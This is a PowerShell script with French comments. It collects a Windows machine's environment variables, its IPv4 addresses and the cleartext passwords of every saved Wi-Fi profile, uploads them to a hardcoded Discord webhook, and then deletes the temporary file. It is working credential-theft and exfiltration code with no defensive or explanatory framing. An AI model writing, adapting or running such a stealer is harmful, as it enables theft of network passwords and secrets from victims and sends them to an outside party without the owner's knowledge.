# URL du webhook Discord
$url = "https://discord.com/api/webhooks/1041694504509513849/MjNgj3FYhmCtuOKJmuCyLy2_bOO38Tv3lyklW6KlnIUOms6fGb6gZzKVpEbSsNUdKovI"

# R�cup�rer les informations r�seau et Wi-Fi
try {
    dir env: >> "$env:TEMP\stats.txt"
    Write-Host "Environnement enregistr� avec succ�s."
} catch {
    Write-Host "Erreur lors de l'enregistrement de l'environnement : $_"
}

try {
    Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' } >> "$env:TEMP\stats.txt"
} catch {
    Write-Host "Erreur lors de la r�cup�ration des informations IP : $_"
}

try {
    (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        (netsh wlan show profile name="$name" key=clear)
    } | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
        $pass = $_.Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{
            PROFILE_NAME = $name
            PASSWORD     = $pass
        }
    } | Format-Table -AutoSize >> "$env:TEMP\stats.txt"
} catch {
    Write-Host "Erreur lors de la r�cup�ration des informations Wi-Fi : $_"
}

# Envoyer un message avec le fichier
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{
    'Content-Type' = "multipart/form-data; boundary=$boundary"
}

$fileContent = Get-Content -Path "$env:TEMP\stats.txt" -Raw
$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="stats.txt"
Content-Type: text/plain

$fileContent
--$boundary--
"@

try {
    Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
    Write-Host "Message envoy� avec succ�s."
} catch {
    Write-Host "Erreur lors de l'envoi du message : $_"
}

# Supprimer le fichier temporaire
Remove-Item "$env:TEMP\stats.txt"
